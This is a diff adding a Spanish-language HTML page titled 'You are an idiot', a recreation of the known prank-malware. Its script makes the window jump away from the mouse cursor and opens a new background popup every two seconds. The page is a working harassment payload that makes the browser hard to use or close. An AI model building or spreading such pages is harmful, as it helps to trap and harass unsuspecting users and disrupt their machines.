@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>You are an idiot</title>
+  <style>
+    body { 
+      margin: 0; 
+      background-color: black; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      overflow: hidden;
+    }
+    video { 
+      width: 100%; 
+      height: 100%; 
+      outline: none; 
+    }
+  </style>
+</head>
+<body>
+  <video autoplay loop muted>
+    <source src="tu_video.mp4" type="video/mp4">
+    Tu navegador no soporta la reproducción de video.
+  </video>
+  
+  <script>
+    // Función para hacer que la ventana "huya" del ratón
+    document.addEventListener('mousemove', (event) => {
+      const distancia = 100;
+      const ventanaX = window.screenX + window.outerWidth / 2;
+      const ventanaY = window.screenY + window.outerHeight / 2;
+
+      if (Math.abs(event.screenX - ventanaX) < distancia && Math.abs(event.screenY - ventanaY) < distancia) {
+        const nuevaX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
+        const nuevaY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
+        window.moveTo(nuevaX, nuevaY);
+      }
+    });
+
+    // Configuración para abrir más ventanas
+    setInterval(() => {
+      const win = window.open('popup.html', '_blank', 'width=400,height=300');
+      if (win) {
+        win.blur();
+      }
+    }, 2000);
+  </script>
+</body>
+</html>
